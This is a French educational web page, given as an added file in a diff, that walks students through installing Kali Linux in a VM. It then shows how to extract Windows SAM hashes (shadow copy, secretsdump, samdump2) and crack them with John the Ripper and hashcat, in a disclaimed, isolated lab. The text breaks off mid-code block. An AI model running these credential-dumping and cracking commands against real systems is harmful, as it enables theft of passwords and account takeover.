@@ -1,0 +1,806 @@
+<!DOCTYPE html>
+<html class="writer-html5" lang="en" >
+<head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+      <link rel="shortcut icon" href="../img/favicon.ico" />
+    <title>Guide Kali Linux &amp; Attaque de la Base SAM - mission 1 mille nuits</title>
+    <link rel="stylesheet" href="../css/theme.css" />
+    <link rel="stylesheet" href="../css/theme_extra.css" />
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/github.min.css" />
+    
+      <script>
+        // Current page data
+        var mkdocs_page_name = "Guide Kali Linux \u0026amp; Attaque de la Base SAM";
+        var mkdocs_page_input_path = "kali.md";
+        var mkdocs_page_url = null;
+      </script>
+    
+    <!--[if lt IE 9]>
+      <script src="../js/html5shiv.min.js"></script>
+    <![endif]-->
+      <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/highlight.min.js"></script>
+      <script>hljs.highlightAll();</script> 
+</head>
+
+<body class="wy-body-for-nav" role="document">
+
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side stickynav">
+    <div class="wy-side-scroll">
+      <div class="wy-side-nav-search">
+          <a href=".." class="icon icon-home"> mission 1 mille nuits
+        </a><div role="search">
+  <form id ="rtd-search-form" class="wy-form" action="../search.html" method="get">
+      <input type="text" name="q" placeholder="Search docs" aria-label="Search docs" title="Type search term here" />
+  </form>
+</div>
+      </div>
+
+      <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <ul>
+                <li class="toctree-l1"><a class="reference internal" href="..">Home</a>
+                </li>
+              </ul>
+              <ul>
+                <li class="toctree-l1"><a class="" href="../about.md">About</a>
+                </li>
+              </ul>
+      </div>
+    </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
+      <nav class="wy-nav-top" role="navigation" aria-label="Mobile navigation menu">
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="..">mission 1 mille nuits</a>
+        
+      </nav>
+      <div class="wy-nav-content">
+        <div class="rst-content"><div role="navigation" aria-label="breadcrumbs navigation">
+  <ul class="wy-breadcrumbs">
+    <li><a href=".." class="icon icon-home" aria-label="Docs"></a></li>
+      <li class="breadcrumb-item active">Guide Kali Linux &amp; Attaque de la Base SAM</li>
+    <li class="wy-breadcrumbs-aside">
+    </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+            <div class="section" itemprop="articleBody">
+              
+                <h1 id="guide-kali-linux-attaque-de-la-base-sam">Guide Kali Linux &amp; Attaque de la Base SAM</h1>
+<blockquote>
+<p>Référence pour Étudiants en Informatique — Sécurité offensive et tests de pénétration</p>
+<p>⚠️ <strong>Avertissement légal :</strong> Les techniques présentées dans ce document sont à des fins <strong>strictement éducatives</strong> dans un environnement de laboratoire isolé. Toute utilisation sur des systèmes sans autorisation explicite est <strong>illégale</strong> et passible de poursuites pénales. Ne pratiquez que sur vos propres machines ou dans un cadre pédagogique autorisé.</p>
+</blockquote>
+<hr />
+<h2 id="table-des-matieres">Table des Matières</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Sujet</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>01</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#01--installation-de-kali-linux">Installation de Kali Linux</a></td>
+</tr>
+<tr>
+<td>02</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#02--pr%C3%A9sentation-de-la-base-sam">Présentation de la base SAM</a></td>
+</tr>
+<tr>
+<td>03</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#03--extraction-des-hachages-sam">Extraction des hachages SAM</a></td>
+</tr>
+<tr>
+<td>04</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#04--attaque-par-dictionnaire-avec-john-the-ripper">Attaque par dictionnaire avec John the Ripper</a></td>
+</tr>
+<tr>
+<td>05</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#05--attaque-par-force-brute-avec-john-the-ripper">Attaque par force brute avec John the Ripper</a></td>
+</tr>
+<tr>
+<td>06</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#06--analyse-des-r%C3%A9sultats">Analyse des résultats</a></td>
+</tr>
+<tr>
+<td>07</td>
+<td><a href="https://claude.ai/chat/7da35f10-10b8-44da-967f-d5893375973b#07--commandes-de-r%C3%A9f%C3%A9rence-rapide">Commandes de référence rapide</a></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="01-installation-de-kali-linux">01 — Installation de Kali Linux</h2>
+<h3 id="prerequis">Prérequis</h3>
+<table>
+<thead>
+<tr>
+<th>Composant</th>
+<th>Minimum</th>
+<th>Recommandé</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>RAM</td>
+<td>2 Go</td>
+<td>4 Go ou plus</td>
+</tr>
+<tr>
+<td>Stockage</td>
+<td>20 Go</td>
+<td>50 Go ou plus</td>
+</tr>
+<tr>
+<td>Processeur</td>
+<td>x64 double cœur</td>
+<td>x64 quad-cœur</td>
+</tr>
+<tr>
+<td>Réseau</td>
+<td>Facultatif</td>
+<td>Recommandé</td>
+</tr>
+</tbody>
+</table>
+<h3 id="options-dinstallation">Options d'installation</h3>
+<p>Il existe trois méthodes principales pour installer Kali Linux :</p>
+<ul>
+<li><strong>Machine virtuelle (VM)</strong> — idéal pour les débutants, installation sur VirtualBox ou VMware sans affecter le système hôte</li>
+<li><strong>Dual boot</strong> — Kali cohabite avec Windows sur le même disque</li>
+<li><strong>Installation native</strong> — Kali comme système principal (déconseillé pour les débutants)</li>
+</ul>
+<blockquote>
+<p><strong>Conseil :</strong> Pour ce guide, l'installation en <strong>machine virtuelle</strong> est recommandée. Elle est sûre, réversible et parfaite pour un environnement de lab.</p>
+</blockquote>
+<hr />
+<h3 id="methode-a-installation-sur-virtualbox-recommandee">Méthode A — Installation sur VirtualBox (recommandée)</h3>
+<h4 id="etape-1-telecharger-liso-kali-linux">Étape 1 — Télécharger l'ISO Kali Linux</h4>
+<p>Rendez-vous sur le site officiel : <strong>https://www.kali.org/get-kali/</strong></p>
+<p>Choisissez l'image <strong>Installer</strong> (64-bit) :</p>
+<pre><code>kali-linux-2024.x-installer-amd64.iso
+</code></pre>
+<p>Vérifiez l'intégrité du fichier avec la somme SHA256 fournie sur le site :</p>
+<pre><code class="language-bash"># Sous Linux/macOS
+sha256sum kali-linux-2024.x-installer-amd64.iso
+
+# Sous Windows (PowerShell)
+Get-FileHash kali-linux-2024.x-installer-amd64.iso -Algorithm SHA256
+</code></pre>
+<h4 id="etape-2-creer-la-machine-virtuelle">Étape 2 — Créer la Machine Virtuelle</h4>
+<ol>
+<li>Ouvrez <strong>VirtualBox</strong> → cliquez sur <strong>Nouvelle</strong></li>
+<li>Renseignez les paramètres suivants :</li>
+</ol>
+<pre><code>Nom :           Kali Linux 2024
+Type :          Linux
+Version :       Debian (64-bit)
+RAM :           4096 Mo  (minimum 2048 Mo)
+Disque dur :    Créer un nouveau disque virtuel VDI
+Taille disque : 50 Go (allocation dynamique)
+</code></pre>
+<ol>
+<li>Avant de démarrer, configurez les paramètres supplémentaires :</li>
+</ol>
+<pre><code>Système → Processeur : 2 CPU
+Affichage → Mémoire vidéo : 128 Mo
+Réseau → Adaptateur 1 : Mode Pont (ou NAT selon votre besoin)
+Stockage → Lecteur optique : sélectionner l'ISO Kali téléchargé
+</code></pre>
+<h4 id="etape-3-demarrer-linstallation">Étape 3 — Démarrer l'Installation</h4>
+<ol>
+<li>Démarrez la VM → le menu de démarrage Kali s'affiche</li>
+<li>Sélectionnez <strong>Graphical Install</strong></li>
+</ol>
+<h4 id="etape-4-configuration-de-la-langue-et-du-clavier">Étape 4 — Configuration de la langue et du clavier</h4>
+<pre><code>Langue :            Français
+Pays :              France (ou votre pays)
+Disposition clavier: Français (AZERTY)
+</code></pre>
+<h4 id="etape-5-configuration-reseau">Étape 5 — Configuration réseau</h4>
+<pre><code>Nom de la machine :  kali-lab
+Domaine :            (laisser vide)
+</code></pre>
+<h4 id="etape-6-creation-du-compte-utilisateur">Étape 6 — Création du compte utilisateur</h4>
+<pre><code>Nom complet :        Etudiant Lab
+Nom d'utilisateur :  etudiant
+Mot de passe :       [choisir un mot de passe fort]
+</code></pre>
+<blockquote>
+<p><strong>Remarque :</strong> Depuis Kali 2020, le compte <code>root</code> n'est plus le compte par défaut. Un utilisateur standard avec accès <code>sudo</code> est créé à la place.</p>
+</blockquote>
+<h4 id="etape-7-partitionnement-du-disque">Étape 7 — Partitionnement du disque</h4>
+<p>Sélectionnez <strong>Utiliser un disque entier</strong> pour une installation simple en VM :</p>
+<pre><code>Disque à partitionner :  VBOX HARDDISK (le disque virtuel)
+Schéma de partitionnement : Tout dans une seule partition
+→ Terminer le partitionnement et appliquer les changements
+→ Confirmer : Oui
+</code></pre>
+<h4 id="etape-8-installation-du-systeme-de-base">Étape 8 — Installation du système de base</h4>
+<p>L'installation copie les fichiers système (~10–20 minutes selon votre machine).</p>
+<h4 id="etape-9-selection-des-logiciels">Étape 9 — Sélection des logiciels</h4>
+<p>Laissez la sélection par défaut :</p>
+<pre><code>✅ Kali desktop environment (GNOME ou Xfce selon la version)
+✅ Top 10 — les 10 outils les plus utilisés en pentest
+✅ Default recommended tools
+</code></pre>
+<h4 id="etape-10-installation-du-chargeur-de-demarrage-grub">Étape 10 — Installation du chargeur de démarrage GRUB</h4>
+<pre><code>Installer GRUB sur le disque principal : Oui
+Périphérique : /dev/sda
+</code></pre>
+<h4 id="etape-11-fin-de-linstallation">Étape 11 — Fin de l'installation</h4>
+<ol>
+<li>Retirez l'ISO du lecteur virtuel</li>
+<li>Redémarrez la VM</li>
+<li>Connectez-vous avec les identifiants créés à l'étape 6</li>
+</ol>
+<hr />
+<h3 id="methode-b-image-virtualbox-pre-configuree-plus-rapide">Méthode B — Image VirtualBox pré-configurée (plus rapide)</h3>
+<p>Kali propose des images VirtualBox et VMware prêtes à l'emploi :</p>
+<ol>
+<li>Téléchargez l'image <code>.ova</code> sur <strong>https://www.kali.org/get-kali/#kali-virtual-machines</strong></li>
+<li>Dans VirtualBox : <strong>Fichier → Importer un appareil virtuel</strong></li>
+<li>Sélectionnez le fichier <code>.ova</code> → suivez l'assistant</li>
+<li>Démarrez la VM</li>
+</ol>
+<pre><code>Identifiants par défaut de l'image pré-configurée :
+Utilisateur : kali
+Mot de passe : kali
+⚠ À modifier immédiatement !
+</code></pre>
+<hr />
+<h3 id="mise-a-jour-post-installation">Mise à jour post-installation</h3>
+<p>Une fois connecté, ouvrez un terminal et mettez le système à jour :</p>
+<pre><code class="language-bash">sudo apt update &amp;&amp; sudo apt full-upgrade -y
+sudo apt autoremove -y
+</code></pre>
+<p>Vérifiez la version installée :</p>
+<pre><code class="language-bash">cat /etc/os-release
+uname -a
+</code></pre>
+<hr />
+<h2 id="02-presentation-de-la-base-sam">02 — Présentation de la Base SAM</h2>
+<h3 id="quest-ce-que-la-base-sam">Qu'est-ce que la base SAM ?</h3>
+<p>La <strong>SAM (Security Account Manager)</strong> est une base de données Windows qui stocke les informations d'authentification des comptes utilisateurs locaux. Elle se trouve à l'emplacement suivant :</p>
+<pre><code>C:\Windows\System32\config\SAM
+</code></pre>
+<h3 id="ce-que-contient-la-sam">Ce que contient la SAM</h3>
+<p>La SAM ne stocke <strong>jamais</strong> les mots de passe en clair. Elle conserve des <strong>hachages</strong> cryptographiques :</p>
+<table>
+<thead>
+<tr>
+<th>Format</th>
+<th>Description</th>
+<th>Exemple</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>LM Hash</strong></td>
+<td>Ancien format (&lt; Windows Vista), très faible</td>
+<td><code>aad3b435b51404ee</code></td>
+</tr>
+<tr>
+<td><strong>NTLM Hash</strong></td>
+<td>Format actuel, MD4 du mot de passe en UTF-16</td>
+<td><code>31d6cfe0d16ae931b73c59d7e0c089c0</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="architecture-de-protection">Architecture de protection</h3>
+<pre><code>  ┌─────────────────────────────────────┐
+  │         Base de registre Windows    │
+  │                                     │
+  │  HKLM\SAM  ──────────────────────── │──▶ Chiffré par SYSKEY
+  │  HKLM\SYSTEM  (contient la clé)  ── │──▶ Nécessaire pour déchiffrer
+  │                                     │
+  └─────────────────────────────────────┘
+
+  Fichiers physiques :
+  C:\Windows\System32\config\SAM
+  C:\Windows\System32\config\SYSTEM
+</code></pre>
+<blockquote>
+<p><strong>Concept clé :</strong> La SAM est verrouillée par Windows en cours d'exécution. Il est impossible de la copier directement depuis un Windows démarré. Il faut passer par des méthodes alternatives (volume shadow copy, démarrage live, etc.).</p>
+</blockquote>
+<hr />
+<h2 id="03-extraction-des-hachages-sam">03 — Extraction des Hachages SAM</h2>
+<h3 id="environnement-du-lab">Environnement du lab</h3>
+<p>Pour ce laboratoire, nous utilisons :</p>
+<pre><code>Machine cible  : Windows 11 (VM VirtualBox)
+Machine attaquante : Kali Linux (VM VirtualBox)
+Réseau : Réseau interne VirtualBox (isolé)
+Accès requis : Administrateur local sur la cible Windows
+</code></pre>
+<blockquote>
+<p>⚠️ <strong>Ce lab nécessite un accès administrateur préalable sur la machine Windows cible.</strong> L'objectif est d'extraire et craquer les hachages, pas de contourner l'authentification Windows.</p>
+</blockquote>
+<hr />
+<h3 id="methode-1-extraction-via-volume-shadow-copy-depuis-windows">Méthode 1 — Extraction via Volume Shadow Copy (depuis Windows)</h3>
+<p>Cette méthode fonctionne depuis Windows avec des droits administrateur, sans démarrer sur un live CD.</p>
+<p><strong>Sur la machine Windows 11 cible</strong>, ouvrez un <strong>Invite de commandes en tant qu'Administrateur</strong> :</p>
+<h4 id="etape-1-creer-un-cliche-instantane-du-volume">Étape 1 — Créer un cliché instantané du volume</h4>
+<pre><code class="language-cmd">wmic shadowcopy call create Volume='C:\'
+</code></pre>
+<h4 id="etape-2-identifier-lid-du-cliche-cree">Étape 2 — Identifier l'ID du cliché créé</h4>
+<pre><code class="language-cmd">vssadmin list shadows
+</code></pre>
+<p>Notez le chemin du dernier cliché, par exemple :</p>
+<pre><code>\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
+</code></pre>
+<h4 id="etape-3-copier-les-fichiers-sam-et-system">Étape 3 — Copier les fichiers SAM et SYSTEM</h4>
+<pre><code class="language-cmd">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
+copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
+</code></pre>
+<h4 id="etape-4-transferer-les-fichiers-vers-kali">Étape 4 — Transférer les fichiers vers Kali</h4>
+<p>Transférez <code>SAM</code> et <code>SYSTEM</code> vers votre machine Kali (via dossier partagé VM, clé USB virtuelle, ou <code>scp</code>).</p>
+<hr />
+<h3 id="methode-2-extraction-avec-impacket-secretsdump-depuis-kali">Méthode 2 — Extraction avec impacket-secretsdump (depuis Kali)</h3>
+<p>Si vous disposez des identifiants d'un compte administrateur Windows, vous pouvez extraire les hachages à distance depuis Kali :</p>
+<pre><code class="language-bash"># Installation d'impacket si nécessaire
+sudo apt install python3-impacket -y
+
+# Extraction à distance
+impacket-secretsdump Administrateur:'MotDePasse'@192.168.1.50
+</code></pre>
+<p>Résultat attendu :</p>
+<pre><code>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+Invité:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</code></pre>
+<hr />
+<h3 id="methode-3-extraction-avec-samdump2-fichiers-copies">Méthode 3 — Extraction avec samdump2 (fichiers copiés)</h3>
+<p>Si vous avez récupéré les fichiers <code>SAM</code> et <code>SYSTEM</code> physiques :</p>
+<pre><code class="language-bash"># Installation
+sudo apt install samdump2 -y
+
+# Extraction des hachages
+samdump2 SYSTEM SAM &gt; hashes.txt
+
+# Vérifier le contenu
+cat hashes.txt
+</code></pre>
+<p>Résultat typique :</p>
+<pre><code>Administrateur:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</code></pre>
+<h3 id="format-des-hachages-ntlm">Format des hachages NTLM</h3>
+<pre><code>nom_utilisateur : RID : LM_hash : NTLM_hash :::
+      │            │       │           │
+      │            │       │           └── Hachage MD4 du mot de passe (32 caractères hex)
+      │            │       └────────────── LM hash (désactivé sur Win Vista+, valeur vide)
+      │            └────────────────────── Identifiant relatif (500 = Administrateur)
+      └─────────────────────────────────── Nom du compte
+</code></pre>
+<hr />
+<h2 id="04-attaque-par-dictionnaire-avec-john-the-ripper">04 — Attaque par Dictionnaire avec John the Ripper</h2>
+<h3 id="principe-de-lattaque-par-dictionnaire">Principe de l'attaque par dictionnaire</h3>
+<p>Une attaque par dictionnaire teste une liste de mots de passe courants (le <strong>dictionnaire</strong>) en les hachant un par un et en comparant le résultat au hachage cible. Elle est rapide et efficace contre les mots de passe faibles ou courants.</p>
+<pre><code>  Dictionnaire            John the Ripper           Hachage cible
+  ┌──────────┐           ┌─────────────┐           ┌─────────────┐
+  │ password │ ─ hash ──▶│  MD4(mot)   │──compare─▶│ 8846f7ea... │
+  │ 123456   │           └─────────────┘     ✗      └─────────────┘
+  │ azerty   │                  │
+  │ admin    │           ┌─────────────┐
+  │ letmein  │ ─ hash ──▶│  MD4(mot)   │──compare─▶ ✓ TROUVÉ !
+  └──────────┘           └─────────────┘
+</code></pre>
+<h3 id="installation-et-verification-de-john">Installation et vérification de John</h3>
+<pre><code class="language-bash"># John est préinstallé sur Kali, vérifier la version
+john --version
+
+# Si absent, installer
+sudo apt install john -y
+</code></pre>
+<h3 id="preparer-le-fichier-de-hachages">Préparer le fichier de hachages</h3>
+<p>Assurez-vous que votre fichier <code>hashes.txt</code> contient les hachages au format correct :</p>
+<pre><code class="language-bash">cat hashes.txt
+# Attendu :
+# etudiant:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+</code></pre>
+<p>Si vous n'avez que le hachage NTLM brut, créez un fichier au bon format :</p>
+<pre><code class="language-bash">echo &quot;etudiant:8846f7eaee8fb117ad06bdd830b7586c&quot; &gt; hashes_ntlm.txt
+</code></pre>
+<h3 id="wordlist-rockyoutxt">Wordlist — Rockyou.txt</h3>
+<p>Kali inclut le célèbre dictionnaire <strong>rockyou.txt</strong> contenant plus de 14 millions de mots de passe réels issus de fuites de données :</p>
+<pre><code class="language-bash"># Localiser rockyou.txt
+locate rockyou.txt
+
+# Il se trouve généralement ici :
+ls -lh /usr/share/wordlists/rockyou.txt.gz
+
+# Décompresser si nécessaire
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+
+# Vérifier le nombre de lignes
+wc -l /usr/share/wordlists/rockyou.txt
+# → 14 344 391 mots de passe
+</code></pre>
+<h3 id="lancer-lattaque-par-dictionnaire">Lancer l'attaque par dictionnaire</h3>
+<h4 id="attaque-basique-avec-rockyoutxt">Attaque basique avec rockyou.txt</h4>
+<pre><code class="language-bash">john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre>
+<h4 id="attaque-avec-format-auto-detecte">Attaque avec format auto-détecté</h4>
+<pre><code class="language-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre>
+<h4 id="attaque-avec-regles-de-transformation-mangling-rules">Attaque avec règles de transformation (mangling rules)</h4>
+<p>Les règles appliquent des transformations automatiques sur chaque mot du dictionnaire (majuscules, ajout de chiffres, substitutions, etc.) :</p>
+<pre><code class="language-bash"># Règles par défaut de John
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules hashes.txt
+
+# Règles Jumbo (plus complètes, Kali inclut John Jumbo)
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt --rules=jumbo hashes.txt
+</code></pre>
+<p>Exemples de transformations appliquées par les règles :</p>
+<pre><code>password   →  Password, PASSWORD, p@ssword, passw0rd, password123
+admin      →  Admin, ADMIN, adm1n, admin!, Admin2024
+</code></pre>
+<h4 id="attaque-avec-un-dictionnaire-personnalise">Attaque avec un dictionnaire personnalisé</h4>
+<pre><code class="language-bash"># Créer un dictionnaire ciblé
+cat &gt; mon_dico.txt &lt;&lt; EOF
+azerty
+Azerty123
+motdepasse
+Motdepasse1
+NomEntreprise2024
+Kali@2024
+EOF
+
+john --format=NT --wordlist=mon_dico.txt hashes.txt
+</code></pre>
+<h3 id="suivre-la-progression">Suivre la progression</h3>
+<pre><code class="language-bash"># Pendant l'attaque, appuyez sur Entrée pour voir la progression
+# Ou dans un autre terminal :
+john --status
+
+# Affichage typique :
+# 0g 0:00:00:12  3.2% (ETA: 14:35:22) 0g/s 1842Kp/s 1842Kc/s
+# g = mots de passe trouvés, p/s = mots testés par seconde
+</code></pre>
+<h3 id="afficher-les-mots-de-passe-trouves">Afficher les mots de passe trouvés</h3>
+<pre><code class="language-bash"># Afficher les résultats trouvés
+john --show hashes.txt
+
+# Afficher uniquement les hachages NT
+john --show --format=NT hashes.txt
+</code></pre>
+<p>Exemple de résultat :</p>
+<pre><code>etudiant:password:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+
+1 password hash cracked, 0 left
+</code></pre>
+<blockquote>
+<p><strong>Conseil :</strong> John sauvegarde automatiquement sa progression dans <code>~/.john/john.pot</code>. Pour relancer une attaque sur un hachage déjà cracké, supprimez cette entrée ou utilisez <code>--pot=fichier_different.pot</code>.</p>
+</blockquote>
+<hr />
+<h2 id="05-attaque-par-force-brute-avec-john-the-ripper">05 — Attaque par Force Brute avec John the Ripper</h2>
+<h3 id="principe-de-lattaque-par-force-brute">Principe de l'attaque par force brute</h3>
+<p>La force brute teste <strong>toutes les combinaisons possibles</strong> de caractères selon un jeu de caractères et une longueur définis. Elle est exhaustive mais très lente — particulièrement sur les mots de passe longs.</p>
+<pre><code>  Jeu de caractères : a-z (26 lettres)
+  Longueur : 4 caractères
+  Combinaisons : 26^4 = 456 976
+
+  aaaa → aab → aac → ... → zzzz
+  ┌──────────────────────────────┐
+  │ Toutes les combinaisons sont │
+  │ testées sans exception       │
+  │ ✓ Garantit de trouver le MDP │
+  │ ✗ Peut prendre très longtemps│
+  └──────────────────────────────┘
+</code></pre>
+<h3 id="modes-de-force-brute-dans-john">Modes de force brute dans John</h3>
+<p>John the Ripper utilise les <strong>masques</strong> pour définir précisément le jeu de caractères à utiliser.</p>
+<h4 id="jeux-de-caracteres-disponibles-charsets">Jeux de caractères disponibles (charsets)</h4>
+<table>
+<thead>
+<tr>
+<th>Symbole</th>
+<th>Caractères inclus</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>?l</code></td>
+<td>Minuscules : <code>a-z</code></td>
+</tr>
+<tr>
+<td><code>?u</code></td>
+<td>Majuscules : <code>A-Z</code></td>
+</tr>
+<tr>
+<td><code>?d</code></td>
+<td>Chiffres : <code>0-9</code></td>
+</tr>
+<tr>
+<td><code>?s</code></td>
+<td>Symboles : <code>!@#$%^&amp;*</code> etc.</td>
+</tr>
+<tr>
+<td><code>?a</code></td>
+<td>Tous : minuscules + majuscules + chiffres + symboles</td>
+</tr>
+<tr>
+<td><code>?h</code></td>
+<td>Hexadécimal bas : <code>0-9a-f</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h3 id="attaque-force-brute-mode-incremental-automatique">Attaque force brute — Mode Incremental (automatique)</h3>
+<p>Le mode <code>--incremental</code> de John teste toutes les combinaisons de longueur croissante automatiquement :</p>
+<pre><code class="language-bash"># Force brute complète (très lent, toutes longueurs et tous caractères)
+john --format=NT --incremental hashes.txt
+
+# Force brute sur chiffres uniquement (codes PIN, etc.)
+john --format=NT --incremental=Digits hashes.txt
+
+# Force brute sur minuscules uniquement
+john --format=NT --incremental=Lower hashes.txt
+
+# Force brute sur minuscules + chiffres
+john --format=NT --incremental=LowerNum hashes.txt
+
+# Force brute sur l'alphabet complet
+john --format=NT --incremental=Alpha hashes.txt
+</code></pre>
+<hr />
+<h3 id="attaque-force-brute-mode-masque-recommande">Attaque force brute — Mode Masque (recommandé)</h3>
+<p>Le mode masque permet de cibler précisément la structure du mot de passe, ce qui est beaucoup plus efficace :</p>
+<pre><code class="language-bash"># Mot de passe de 4 caractères, minuscules uniquement
+john --format=NT --mask='?l?l?l?l' hashes.txt
+
+# Mot de passe de 6 chiffres (code PIN)
+john --format=NT --mask='?d?d?d?d?d?d' hashes.txt
+
+# Mot de passe de 8 caractères : 1 majuscule + 5 minuscules + 2 chiffres
+john --format=NT --mask='?u?l?l?l?l?l?d?d' hashes.txt
+
+# Mot de passe de longueur variable (6 à 8 caractères, tout type)
+john --format=NT --mask='?a?a?a?a?a?a' --min-length=6 --max-length=8 hashes.txt
+
+# Mot de passe commençant par une majuscule, suivi de minuscules et finissant par des chiffres
+john --format=NT --mask='?u?l?l?l?l?d?d?d' hashes.txt
+</code></pre>
+<h4 id="exemple-pratique-mot-de-passe-type-prenom2024">Exemple pratique — mot de passe type "Prenom2024"</h4>
+<pre><code class="language-bash"># Structure : 1 majuscule + minuscules (longueur variable) + 4 chiffres
+# On suppose 5 minuscules + 4 chiffres
+john --format=NT --mask='?u?l?l?l?l?l?d?d?d?d' hashes.txt
+</code></pre>
+<hr />
+<h3 id="combiner-force-brute-et-dictionnaire-attaque-hybride">Combiner force brute et dictionnaire (attaque hybride)</h3>
+<p>Une attaque hybride combine un dictionnaire avec des mutations en suffixe/préfixe :</p>
+<pre><code class="language-bash"># Dictionnaire + chiffres en suffixe (ex: password123, admin2024)
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \
+     --mask='?w?d?d?d?d' hashes.txt
+
+# Dictionnaire + symbole + chiffres
+john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt \
+     --mask='?w?s?d?d' hashes.txt
+</code></pre>
+<blockquote>
+<p><strong>Rappel :</strong> <code>?w</code> représente le mot courant du dictionnaire dans une attaque hybride.</p>
+</blockquote>
+<hr />
+<h3 id="limiter-le-temps-dexecution">Limiter le temps d'exécution</h3>
+<pre><code class="language-bash"># Arrêter après 1 heure
+john --format=NT --incremental hashes.txt --max-run-time=3600
+
+# Arrêter après avoir trouvé N mots de passe
+john --format=NT --incremental hashes.txt --max-crack=1
+</code></pre>
+<hr />
+<h3 id="reprendre-une-attaque-interrompue">Reprendre une attaque interrompue</h3>
+<p>John sauvegarde automatiquement sa progression :</p>
+<pre><code class="language-bash"># Reprendre là où l'attaque s'est arrêtée
+john --restore
+
+# Reprendre une session nommée
+john --restore=nom_session
+
+# Lancer une attaque avec un nom de session
+john --format=NT --incremental hashes.txt --session=ma_session
+</code></pre>
+<hr />
+<h2 id="06-analyse-des-resultats">06 — Analyse des Résultats</h2>
+<h3 id="afficher-tous-les-mots-de-passe-crackes">Afficher tous les mots de passe crackés</h3>
+<pre><code class="language-bash"># Afficher les résultats depuis le fichier pot
+john --show hashes.txt
+
+# Format détaillé
+john --show --format=NT hashes.txt
+</code></pre>
+<h3 id="lire-le-fichier-pot-directement">Lire le fichier .pot directement</h3>
+<pre><code class="language-bash">cat ~/.john/john.pot
+# Format : $NT$hash:motdepasse_en_clair
+</code></pre>
+<h3 id="comparer-les-performances">Comparer les performances</h3>
+<table>
+<thead>
+<tr>
+<th>Méthode</th>
+<th>Vitesse typique</th>
+<th>Efficacité</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Dictionnaire (rockyou)</td>
+<td>~5–10 millions/s</td>
+<td>Élevée sur mots courants</td>
+</tr>
+<tr>
+<td>Dictionnaire + règles</td>
+<td>~1–3 millions/s</td>
+<td>Très élevée</td>
+</tr>
+<tr>
+<td>Force brute (masque court)</td>
+<td>~500K–2M/s</td>
+<td>Totale mais lente</td>
+</tr>
+<tr>
+<td>Force brute (incrémental)</td>
+<td>Variable</td>
+<td>Garantie mais peut prendre des années</td>
+</tr>
+</tbody>
+</table>
+<blockquote>
+<p><strong>Remarque :</strong> Les performances dépendent fortement du matériel. Un GPU dédié avec <strong>Hashcat</strong> est bien plus rapide que John sur CPU pour la force brute pure.</p>
+</blockquote>
+<h3 id="interpreter-les-resultats">Interpréter les résultats</h3>
+<pre><code>etudiant:password → Mot de passe très faible, présent dans rockyou.txt
+admin:Admin2024!  → Cracké par règles (majuscule + année + symbole)
+root:[non trouvé] → Mot de passe fort ou absent du dictionnaire
+</code></pre>
+<hr />
+<h3 id="aller-plus-loin-hashcat-gpu">Aller plus loin — Hashcat (GPU)</h3>
+<p>Pour des attaques plus rapides avec un GPU :</p>
+<pre><code class="language-bash"># Installation
+sudo apt install hashcat -y
+
+# Attaque dictionnaire sur hachages NTLM (mode -m 1000)
+hashcat -m 1000 hashes_ntlm.txt /usr/share/wordlists/rockyou.txt
+
+# Force brute NTLM, 8 caractères, tout type
+hashcat -m 1000 -a 3 hashes_ntlm.txt '?a?a?a?a?a?a?a?a'
+
+# Règles de transformation
